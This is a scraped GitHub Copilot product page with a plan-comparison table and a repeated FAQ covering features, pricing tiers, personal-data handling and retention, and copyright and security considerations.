planIncludedBusiness planIncludedEnterprise planIncludedExplanations in Visual Studio’s Quick Info Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedDebug assistant in Visual Studio Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewUpgrade assistant for Java in VS Code Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewCode review in GitHub Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewCopilot Workspace in pull requests Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedTechnical Preview access to Copilot Workspace Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedSupported environmentsSupported environmentsEditors and IDEs  - [See all supported editors](https://docs.github.com/en/copilot/managing-copilot/configure-personal-settings/installing-the-github-copilot-extension-in-your-environment)Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedgithub.com Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedGitHub Mobile Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedGitHub CLI and Windows Terminal Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedManagement and policiesManagement and policiesPublic code filter with code referencing Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedUser management Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedData excluded from training by default Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedEnterprise-grade security Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedIP indemnity Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedContent exclusions Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedSAML SSO authentication [1](#footnote-1)Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedUsage metrics Free planNot includedPro planNot includedBusiness planIncludedEnterprise planIncludedRequires GitHub Enterprise Cloud Free planNot includedPro planNot includedBusiness planNot includedEnterprise planIncludedHow to get started[Get started](https://github.com/copilot)[Get started](/github-copilot/signup/copilot_individual?cft=copilot_lo.features_copilot.cfi)[Get started](/github-copilot/purchase?priority=business&cft=copilot_lo.features_copilot.cfb)[Get started](/github-copilot/purchase?priority=enterprise&cft=copilot_lo.features_copilot.ce)
## Get the most out of GitHub Copilot

### [Preview the latest features](https://github.com/features/preview)

Be the first to explore what’s next for GitHub Copilot.

See previews
### [Explore The GitHub Blog](https://github.blog/)

Discover the latest in software development with insights, best practices, and more.

Read Blog
### [Visit the GitHub Copilot Trust Center](https://copilot.github.trust.page/)

Gain peace of mind with our security, privacy, and responsible AI policies.

Go to Trust Center
### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

#### Plans & Pricing

#### What are the differences between the Free, Pro, Business, and Enterprise plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

### Plans & Pricing

#### What are the differences between the Free, Pro, Business, and Enterprise plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

